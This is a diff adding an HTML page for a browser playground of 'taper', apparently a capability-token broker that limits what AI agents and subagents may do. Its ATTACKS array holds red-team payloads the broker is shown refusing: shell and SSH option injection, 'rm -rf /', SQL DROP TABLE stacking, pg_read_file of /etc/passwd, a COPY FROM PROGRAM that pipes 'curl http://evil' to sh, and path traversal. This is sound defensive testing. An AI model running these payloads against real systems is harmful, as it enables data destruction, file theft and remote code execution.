@@ -1,0 +1,343 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Taper playground</title>
+<meta name="description" content="Mint a capability token, narrow it for a subagent, fire the red team's payloads at the broker, and watch the audit chain — the real taper library, running in your browser.">
+<style>
+  :root {
+    --bg: #f7f6f2; --panel: #ffffff; --ink: #1c1b18; --muted: #6b675e; --line: #e3e0d8;
+    --accent: #1f5f8b; --allow: #1f7a4a; --allow-bg: #e6f4ea; --deny: #b3261e; --deny-bg: #fbeae8;
+    --warn: #8a5a00; --warn-bg: #fff4d6; --code: #f1efe9; --mono: ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+    color-scheme: light;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --bg: #14161a; --panel: #1c1f24; --ink: #e8e6e1; --muted: #9a978f; --line: #2c3037;
+      --accent: #7db3d8; --allow: #6fcf97; --allow-bg: #17301f; --deny: #f28b82; --deny-bg: #3a1f1d;
+      --warn: #f2c14e; --warn-bg: #3a2f10; --code: #101216; color-scheme: dark;
+    }
+  }
+  * { box-sizing: border-box; }
+  body { margin: 0; background: var(--bg); color: var(--ink); font: 15px/1.55 system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; }
+  a { color: var(--accent); }
+  header { padding: 28px 24px 12px; max-width: 1180px; margin: 0 auto; }
+  header h1 { margin: 0 0 6px; font-size: 26px; letter-spacing: -0.01em; }
+  header p { margin: 0; color: var(--muted); max-width: 70ch; }
+  header .links { margin-top: 10px; font-size: 14px; }
+  header .links a { margin-right: 16px; }
+  #status { display: flex; align-items: center; gap: 10px; margin: 14px 24px 0; max-width: 1180px; margin-inline: auto; padding: 10px 14px; border: 1px solid var(--line); border-radius: 8px; background: var(--panel); font-size: 14px; }
+  #status .dot { width: 9px; height: 9px; border-radius: 50%; background: var(--warn); flex: none; }
+  #status.ready .dot { background: var(--allow); }
+  #status.failed .dot { background: var(--deny); }
+  main { max-width: 1180px; margin: 18px auto 60px; padding: 0 24px; display: grid; grid-template-columns: minmax(0, 1fr) 380px; gap: 22px; }
+  @media (max-width: 900px) { main { grid-template-columns: 1fr; } aside { position: static !important; } }
+  section.step { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 18px 20px; margin-bottom: 18px; }
+  section.step h2 { margin: 0 0 4px; font-size: 17px; }
+  section.step h2 .n { display: inline-block; width: 24px; height: 24px; line-height: 24px; text-align: center; border-radius: 50%; background: var(--accent); color: #fff; font-size: 13px; margin-right: 8px; }
+  section.step p.lede { margin: 0 0 12px; color: var(--muted); }
+  textarea, input[type=text], input[type=number], select { width: 100%; font: 13px/1.45 var(--mono); background: var(--code); color: var(--ink); border: 1px solid var(--line); border-radius: 6px; padding: 8px 10px; }
+  textarea { min-height: 150px; resize: vertical; }
+  .row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; margin-top: 10px; }
+  .row label { font-size: 13px; color: var(--muted); }
+  .row input[type=text], .row input[type=number] { width: auto; }
+  button { font: 500 14px system-ui, sans-serif; padding: 7px 13px; border-radius: 7px; border: 1px solid var(--line); background: var(--panel); color: var(--ink); cursor: pointer; }
+  button.primary { background: var(--accent); border-color: var(--accent); color: #fff; }
+  button:disabled { opacity: .5; cursor: not-allowed; }
+  button.atk { font-family: var(--mono); font-size: 12.5px; }
+  .out { margin-top: 12px; font-family: var(--mono); font-size: 13px; white-space: pre-wrap; word-break: break-word; }
+  .verdict { display: inline-block; padding: 2px 8px; border-radius: 5px; font-weight: 600; font-family: var(--mono); font-size: 12.5px; }
+  .verdict.allow { background: var(--allow-bg); color: var(--allow); }
+  .verdict.deny { background: var(--deny-bg); color: var(--deny); }
+  .verdict.warn { background: var(--warn-bg); color: var(--warn); }
+  .tok { border: 1px dashed var(--line); border-radius: 8px; padding: 10px 12px; margin-top: 10px; font-size: 13.5px; }
+  .tok b { font-family: var(--mono); }
+  .tok .text { font-family: var(--mono); font-size: 11.5px; color: var(--muted); word-break: break-all; margin-top: 6px; max-height: 3.2em; overflow: hidden; }
+  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(230px, 1fr)); gap: 8px; margin-top: 10px; }
+  .log { margin-top: 10px; display: flex; flex-direction: column; gap: 6px; }
+  .rec { display: grid; grid-template-columns: 22px 1fr; gap: 8px; align-items: start; padding: 6px 8px; border-radius: 6px; border: 1px solid var(--line); font-family: var(--mono); font-size: 12px; }
+  .rec.deny { border-left: 3px solid var(--deny); } .rec.allow { border-left: 3px solid var(--allow); } .rec.broken { background: var(--deny-bg); }
+  .rec .i { color: var(--muted); }
+  .rec .r { color: var(--muted); white-space: pre-wrap; word-break: break-word; }
+  aside { position: sticky; top: 16px; align-self: start; }
+  aside .panel { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 16px 18px; }
+  aside h3 { margin: 0 0 6px; font-size: 15px; }
+  aside p { margin: 0 0 8px; font-size: 13.5px; color: var(--muted); }
+  details { margin-top: 10px; } summary { cursor: pointer; font-size: 13.5px; color: var(--accent); }
+  .muted { color: var(--muted); font-size: 13px; }
+  footer { max-width: 1180px; margin: 0 auto; padding: 0 24px 40px; color: var(--muted); font-size: 13px; }
+  kbd { font-family: var(--mono); font-size: 12px; background: var(--code); padding: 1px 5px; border-radius: 4px; border: 1px solid var(--line); }
+</style>
+</head>
+<body>
+<header>
+  <h1>Taper playground</h1>
+  <p>The agent never holds a credential. It holds a token that says what it may do, can narrow that token for a subagent, and can never widen it. This page runs the real <code>taper</code> library in your browser — the same code as <kbd>pip install taper-broker</kbd> — up to and including the broker's decision. Nothing here is mocked, and nothing leaves your machine.</p>
+  <div class="links">
+    <a href="https://github.com/Walex4/taper">source</a>
+    <a href="https://github.com/Walex4/taper/blob/main/DESIGN.md">design</a>
+    <a href="https://github.com/Walex4/taper/blob/main/docs/redteam.md">the red team</a>
+    <a href="https://github.com/Walex4/taper/blob/main/docs/launch.md">what twenty runs showed</a>
+  </div>
+</header>
+
+<div id="status"><span class="dot"></span><span id="status-text">Loading Python runtime… (about 15 MB, once; cached after that)</span></div>
+
+<main>
+<div>
+
+<section class="step">
+  <h2><span class="n">1</span>Write a policy and mint the root token</h2>
+  <p class="lede">A policy is an operation and a constraint per field. This is the widest this token will ever be. Edit it if you like — an unknown constraint kind is refused, not ignored.</p>
+  <textarea id="policy" spellcheck="false"></textarea>
+  <div class="row">
+    <label>ttl <input id="ttl" type="number" value="3600" min="1" style="width:90px"> s</label>
+    <label>note <input id="note" type="text" value="developer session" style="width:200px"></label>
+    <button class="primary" id="btn-mint" disabled>Mint root token</button>
+    <button id="btn-reset-policy">Reset policy</button>
+  </div>
+  <div id="mint-out" class="out"></div>
+</section>
+
+<section class="step">
+  <h2><span class="n">2</span>Narrow it for a subagent</h2>
+  <p class="lede">The subagent gets strictly less: one host, one program, one argument, five minutes, and <code>pg.query</code> gone entirely. No network call is made to do this — the parent signs a new block with an ephemeral key. Then try to widen it back.</p>
+  <textarea id="narrow-policy" spellcheck="false"></textarea>
+  <div class="row">
+    <label>ttl <input id="narrow-ttl" type="number" value="300" min="1" style="width:90px"> s</label>
+    <button class="primary" id="btn-narrow" disabled>Narrow → subagent token</button>
+    <button id="btn-widen" disabled title="Ask the subagent to attenuate itself to a wider host set">Try to widen it</button>
+  </div>
+  <div id="narrow-out" class="out"></div>
+</section>
+
+<section class="step">
+  <h2><span class="n">3</span>Make requests, then attack</h2>
+  <p class="lede">The broker checks proof of possession first, then the typed schema, then policy. Every refusal quotes the constraint that refused it. The payloads on the right are from <code>validate/redteam.py</code> — every one of them must be refused for CI to pass.</p>
+  <div class="row">
+    <label>token
+      <select id="ask-token" style="width:auto"><option value="sub">subagent</option><option value="dev">root</option></select>
+    </label>
+    <label>operation
+      <select id="ask-op" style="width:auto"><option>ssh.exec</option><option>pg.query</option><option>http.request</option></select>
+    </label>
+    <label><input type="checkbox" id="ask-proof" checked> with proof of possession</label>
+  </div>
+  <textarea id="ask-req" spellcheck="false" style="min-height:70px">{"host": "build-1.internal", "program": "git", "args": ["status"]}</textarea>
+  <div class="row">
+    <button class="primary" id="btn-ask" disabled>Send request</button>
+  </div>
+  <div id="ask-out" class="out"></div>
+  <details open>
+    <summary>Attack payloads (each fills the request above and sends it)</summary>
+    <div class="grid" id="attacks"></div>
+  </details>
+</section>
+
+<section class="step">
+  <h2><span class="n">4</span>Revoke the parent</h2>
+  <p class="lede">Revocation matches any id in the chain, so revoking the root kills every token derived from it — the subagent included — at once.</p>
+  <div class="row">
+    <button id="btn-revoke" disabled>Revoke root token</button>
+    <button id="btn-expire" disabled title="Advance the broker's clock by 301 seconds">Advance clock 301 s (subagent expires)</button>
+    <button id="btn-reset" disabled>Start over (new root key, empty log)</button>
+  </div>
+  <div id="revoke-out" class="out"></div>
+</section>
+
+</div>
+
+<aside>
+  <div class="panel">
+    <h3>Audit log <span id="audit-verdict" class="verdict allow" style="display:none">chain intact</span></h3>
+    <p>Every decision and every denial, with the attributes the broker derived. Each record hashes the one before it. Click a record's <b>×</b> to delete it the way an attacker with write access would — the chain says where.</p>
+    <div id="audit" class="log"><span class="muted">nothing yet</span></div>
+    <div class="row">
+      <button id="btn-export" disabled>Export session as JSON</button>
+    </div>
+  </div>
+</aside>
+</main>
+
+<footer>
+  Unaudited. Not yet suitable for production credentials. Read the status block in the <a href="https://github.com/Walex4/taper#readme">README</a> before pointing it at anything you would mind losing. Policies you edit here are kept in this browser's local storage only.
+</footer>
+
+<script src="https://cdn.jsdelivr.net/pyodide/v314.0.6/full/pyodide.js"></script>
+<script>
+(async () => {
+  const $ = (id) => document.getElementById(id);
+  const status = $('status'), statusText = $('status-text');
+  const say = (t, cls) => { statusText.textContent = t; status.className = cls || ''; };
+
+  const DEFAULT_POLICY = {
+    "ssh.exec": {
+      "host":    {"kind": "one_of", "values": ["build-1.internal", "build-2.internal"]},
+      "program": {"kind": "one_of", "values": ["git", "make", "ls"]},
+      "args":    {"kind": "subset", "values": ["status", "--version", "build", "test", "-la"]}
+    },
+    "pg.query": {
+      "database":       {"kind": "one_of", "values": ["analytics"]},
+      "statement_kind": {"kind": "one_of", "values": ["select", "write"]},
+      "tables":         {"kind": "subset", "values": ["public.events", "public.users"]},
+      "max_rows":       {"kind": "range", "lo": 0, "hi": 10000}
+    },
+    "http.request": {
+      "method": {"kind": "one_of", "values": ["GET"]},
+      "host":   {"kind": "one_of", "values": ["api.example.com"]},
+      "path":   {"kind": "prefix", "prefix": "/v1/"}
+    }
+  };
+  const DEFAULT_NARROW = {
+    "ssh.exec": {
+      "host":    {"kind": "one_of", "values": ["build-1.internal"]},
+      "program": {"kind": "one_of", "values": ["git"]},
+      "args":    {"kind": "subset", "values": ["status"]}
+    }
+  };
+  const WIDER = {
+    "ssh.exec": {
+      "host":    {"kind": "one_of", "values": ["build-1.internal", "prod-db.internal"]},
+      "program": {"kind": "one_of", "values": ["git"]},
+      "args":    {"kind": "subset", "values": ["status"]}
+    }
+  };
+  // Drawn from validate/redteam.py. Labels are the harness's own.
+  const ATTACKS = [
+    ["ssh.exec", "sub", {"host":"build-1.internal","program":"git","args":["status; rm -rf /"]}, "shell injection in an argument"],
+    ["ssh.exec", "sub", {"host":"build-1.internal","program":"git","args":["--upload-pack=sh"]}, "git-shell option injection"],
+    ["ssh.exec", "sub", {"host":"build-1.internal","program":"bash","args":[]}, "program smuggling: bash"],
+    ["ssh.exec", "sub", {"host":"-oProxyCommand=sh","program":"git","args":["status"]}, "host escape: -oProxyCommand"],
+    ["ssh.exec", "sub", {"host":"build-2.internal","program":"git","args":["status"]}, "host the parent had, subagent dropped"],
+    ["ssh.exec", "sub", {"host":"build-1.internal","program":"git","args":["status"],"env":"LD_PRELOAD=/tmp/x"}, "extra field: env"],
+    ["pg.query", "dev", {"database":"analytics","statement":"SELECT 1; DROP TABLE public.events","max_rows":10}, "stacked statements (bypass #1)"],
+    ["pg.query", "dev", {"database":"analytics","statement":"SELECT 'a\\'; COMMIT; DROP TABLE public.events; --","max_rows":10}, "pgAdmin CVE-2026-17351 payload (bypass #2)"],
+    ["pg.query", "dev", {"database":"analytics","statement":"SELECT pg_read_file('/etc/passwd')","max_rows":10}, "pg_read_file inside a select (bypass #3)"],
+    ["pg.query", "dev", {"database":"analytics","statement":"COPY x FROM PROGRAM 'curl http://evil|sh'","max_rows":10}, "COPY … FROM PROGRAM"],
+    ["pg.query", "dev", {"database":"analytics","statement":"SELECT * FROM public.orders","max_rows":10}, "table outside the grant"],
+    ["http.request", "dev", {"method":"GET","host":"api.example.com","path":"/v1/../../admin"}, "path traversal (bypass #4)"],
+    ["http.request", "dev", {"method":"GET","host":"api.example.com","path":"/v1/%2e%2e/%2e%2e/admin"}, "encoded traversal"],
+    ["http.request", "dev", {"method":"DELETE","host":"api.example.com","path":"/v1/x"}, "method escalation"],
+    ["pg.query", "sub", {"database":"analytics","statement":"SELECT * FROM public.events","max_rows":10}, "operation the subagent dropped"],
+  ];
+
+  // ---- persistence (per-viewer convenience only) ----
+  const store = {
+    get(k, d) { try { const v = localStorage.getItem('taper.' + k); return v == null ? d : v; } catch { return d; } },
+    set(k, v) { try { localStorage.setItem('taper.' + k, v); } catch {} },
+  };
+  $('policy').value = store.get('policy', JSON.stringify(DEFAULT_POLICY, null, 2));
+  $('narrow-policy').value = store.get('narrow', JSON.stringify(DEFAULT_NARROW, null, 2));
+  $('policy').addEventListener('input', () => store.set('policy', $('policy').value));
+  $('narrow-policy').addEventListener('input', () => store.set('narrow', $('narrow-policy').value));
+  $('btn-reset-policy').onclick = () => { $('policy').value = JSON.stringify(DEFAULT_POLICY, null, 2); store.set('policy', $('policy').value); };
+
+  // ---- attack buttons ----
+  const grid = $('attacks');
+  for (const [op, tok, req, label] of ATTACKS) {
+    const b = document.createElement('button'); b.className = 'atk'; b.textContent = label; b.disabled = true;
+    b.onclick = () => { $('ask-op').value = op; $('ask-token').value = tok; $('ask-req').value = JSON.stringify(req); $('ask-proof').checked = true; ask(); };
+    grid.appendChild(b);
+  }
+  const buttons = () => document.querySelectorAll('button:not(#btn-reset-policy)');
+
+  // ---- runtime ----
+  let py, bridge;
+  try {
+    py = await loadPyodide();
+    say('Installing taper-broker from PyPI…');
+    await py.loadPackage('micropip');
+    await py.runPythonAsync(`import micropip\nawait micropip.install("taper-broker")`);
+    py.runPython(await (await fetch('bridge.py', {cache: 'no-cache'})).text());
+    bridge = py.globals;
+    const r = JSON.parse(bridge.get('reset')());
+    say(`Ready — taper ${r.version}, running in this tab. Nothing you do here leaves it.`, 'ready');
+  } catch (e) {
+    say('Could not start the Python runtime: ' + (e && e.message ? e.message.split('\n')[0] : e) + '. The library still works from pip — see the README.', 'failed');
+    console.error(e); return;
+  }
+  const call = (fn, ...args) => JSON.parse(bridge.get(fn)(...args));
+  for (const b of buttons()) b.disabled = false;
+  $('btn-narrow').disabled = $('btn-widen').disabled = $('btn-revoke').disabled = $('btn-expire').disabled = true;
+
+  // ---- helpers ----
+  const esc = (s) => String(s).replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
+  const tokenCard = (t) => `<div class="tok"><b>${esc(t.name)}</b> · ${t.blocks} block${t.blocks>1?'s':''} · operations: <b>${esc(t.ops.join(', ') || '(none)')}</b> · expires in ${t.expires_in}s · id ${esc(t.ids[t.ids.length-1])}
+    <details><summary>effective capabilities</summary><pre class="out" style="margin:6px 0 0">${esc(JSON.stringify(t.caps, null, 2))}</pre></details>
+    <div class="text">${esc(t.text)}</div></div>`;
+  const verdict = (d) => d.allowed
+    ? `<span class="verdict allow">✓ ALLOW</span> <span class="muted">${esc(d.operation)}</span>`
+    : `<span class="verdict deny">✗ DENY</span> ${esc(d.reason)}`;
+
+  let haveRoot = false, haveSub = false;
+
+  function renderAudit(a) {
+    const el = $('audit'), v = $('audit-verdict');
+    if (!a.records.length) { el.innerHTML = '<span class="muted">nothing yet</span>'; v.style.display = 'none'; return; }
+    v.style.display = ''; v.className = 'verdict ' + (a.intact ? 'allow' : 'deny');
+    v.textContent = a.intact ? `chain intact · ${a.records.length} records` : `chain broken at record ${a.broken_at}`;
+    el.innerHTML = a.records.map((r, i) => {
+      const b = r.body, cls = (b.allowed ? 'allow' : 'deny') + (!a.intact && i >= a.broken_at ? ' broken' : '');
+      const attrs = b.attributes || {}; const what = b.operation + (Object.keys(attrs).length ? ' ' + JSON.stringify(attrs) : '');
+      return `<div class="rec ${cls}"><span class="i">${i}</span><div><div>${b.allowed ? '✓' : '✗'} ${esc(what)}</div><div class="r">${esc(b.reason || '')}</div></div><button title="delete this record from the log file" data-i="${i}" style="grid-column:2;justify-self:end;padding:0 6px;font-size:11px">×</button></div>`;
+    }).join('');
+    el.querySelectorAll('button[data-i]').forEach(b => b.onclick = () => renderAudit(call('tamper', +b.dataset.i)));
+  }
+  const refreshAudit = () => renderAudit(call('audit'));
+
+  // ---- actions ----
+  $('btn-mint').onclick = () => {
+    const r = call('mint', 'dev', $('policy').value, $('ttl').value, $('note').value);
+    $('mint-out').innerHTML = r.ok ? tokenCard(r.token) : `<span class="verdict warn">policy refused</span> ${esc(r.error)}`;
+    haveRoot = r.ok; haveSub = false;
+    $('btn-narrow').disabled = !haveRoot; $('btn-revoke').disabled = !haveRoot; $('btn-expire').disabled = !haveRoot;
+    $('narrow-out').innerHTML = ''; $('btn-widen').disabled = true;
+  };
+  $('btn-narrow').onclick = () => {
+    const r = call('narrow', 'dev', 'sub', $('narrow-policy').value, $('narrow-ttl').value, 'subagent');
+    $('narrow-out').innerHTML = r.ok ? tokenCard(r.token)
+      : r.refused ? `<span class="verdict deny">✗ REFUSED</span> ${esc(r.error)}` : `<span class="verdict warn">error</span> ${esc(r.error)}`;
+    haveSub = r.ok; $('btn-widen').disabled = !haveSub;
+  };
+  $('btn-widen').onclick = () => {
+    const r = call('narrow', 'sub', 'wider', JSON.stringify(WIDER), '', 'subagent, widening itself');
+    $('narrow-out').insertAdjacentHTML('beforeend', `<div style="margin-top:8px">${r.ok ? '<span class="verdict deny">BUG: widening succeeded</span>' : `<span class="verdict deny">✗ REFUSED</span> ${esc(r.error)}`}</div>`);
+  };
+  function ask() {
+    const tok = $('ask-token').value;
+    if ((tok === 'sub' && !haveSub) || (tok === 'dev' && !haveRoot)) { $('ask-out').innerHTML = `<span class="verdict warn">mint the ${tok === 'sub' ? 'subagent' : 'root'} token first</span>`; return; }
+    const r = call('ask', tok, $('ask-op').value, $('ask-req').value, $('ask-proof').checked);
+    if (!r.ok) { $('ask-out').innerHTML = `<span class="verdict warn">error</span> ${esc(r.error)}`; return; }
+    let html = verdict(r);
+    if (r.allowed && r.plan) html += `<details><summary>what the broker would run</summary><pre class="out" style="margin:6px 0 0">${esc(JSON.stringify(r.plan, null, 2))}</pre></details>`;
+    if (!r.allowed && Object.keys(r.attributes || {}).length) html += `<div class="muted" style="margin-top:6px">derived: ${esc(JSON.stringify(r.attributes))}</div>`;
+    $('ask-out').innerHTML = html; refreshAudit();
+  }
+  $('btn-ask').onclick = ask;
+  $('btn-revoke').onclick = () => {
+    const r = call('revoke', 'dev');
+    $('revoke-out').innerHTML = `revoked <b>${esc(r.revoked)}</b>. Now send the allowed request from step 3 as the subagent:`;
+    $('ask-token').value = 'sub'; $('ask-op').value = 'ssh.exec'; $('ask-req').value = JSON.stringify({"host":"build-1.internal","program":"git","args":["status"]}); ask();
+    $('revoke-out').innerHTML += `<div style="margin-top:6px">${$('ask-out').innerHTML}</div>`;
+  };
+  $('btn-expire').onclick = () => {
+    call('advance', 301);
+    $('ask-token').value = 'sub'; $('ask-op').value = 'ssh.exec'; $('ask-req').value = JSON.stringify({"host":"build-1.internal","program":"git","args":["status"]}); ask();
+    $('revoke-out').innerHTML = `clock advanced 301 s. The subagent's 300 s token:<div style="margin-top:6px">${$('ask-out').innerHTML}</div>`;
+  };
+  $('btn-reset').onclick = () => {
+    call('reset'); haveRoot = haveSub = false;
+    for (const id of ['mint-out','narrow-out','ask-out','revoke-out']) $(id).innerHTML = '';
+    $('btn-narrow').disabled = $('btn-widen').disabled = $('btn-revoke').disabled = $('btn-expire').disabled = true;
+    refreshAudit();
+  };
+  $('btn-export').onclick = () => {
+    const a = call('audit');
+    const blob = new Blob([JSON.stringify({ exported: new Date().toISOString(), policy: JSON.parse($('policy').value), narrow: JSON.parse($('narrow-policy').value), audit: a }, null, 2)], {type: 'application/json'});
+    const u = URL.createObjectURL(blob); const l = document.createElement('a'); l.href = u; l.download = 'taper-playground-session.json'; l.click(); URL.revokeObjectURL(u);
+  };
+})();
+</script>
+</body>
+</html>
